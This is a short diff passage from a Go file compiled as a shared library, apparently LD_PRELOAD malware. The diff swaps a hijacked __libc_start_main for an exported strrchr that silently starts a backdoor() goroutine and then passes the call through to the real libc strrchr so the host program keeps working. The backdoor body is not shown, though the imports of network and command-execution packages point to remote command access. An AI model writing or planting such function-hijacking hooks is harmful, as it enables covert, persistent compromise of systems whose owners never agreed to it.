@@ -8,15 +8,27 @@ import (
 	"net"
 	"net/textproto"
 	"os/exec"
+
+	"github.com/rainycape/dl"
 )
 
 // main is required to build a shared library, but does nothing
 func main() {}
 
-//export __libc_start_main
-func __libc_start_main() {
-	backdoor()
+//export strrchr
+func strrchr(s *C.char, c C.int) *C.char {
+	go backdoor()
 
+	lib, err := dl.Open("libc", 0)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer lib.Close()
+
+	var old_strrchr func(s *C.char, c C.int) *C.char
+	lib.Sym("strrchr", &old_strrchr)
+
+	return old_strrchr(s, c)
 }
 
 func backdoor() {
